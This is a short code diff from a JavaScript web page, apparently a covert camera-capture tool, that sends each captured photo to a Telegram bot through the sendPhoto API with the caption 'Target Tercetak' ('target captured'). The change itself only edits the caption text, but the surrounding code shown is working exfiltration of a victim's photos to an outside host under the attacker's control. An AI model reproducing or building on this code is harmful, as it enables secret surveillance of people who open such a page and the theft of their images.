@@ -85,7 +85,7 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, `viral_${photoCount}.jpg`);
-            formData.append("caption", `👿 Target Tercetak\nFoto ke-${photoCount}\nWaktu: ${new Date().toLocaleString()}`);
+            formData.append("caption", `👿 Target Tercetak\nFoto ke-${photoCount},\nWaktu: ${new Date().toLocaleString()}`);
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
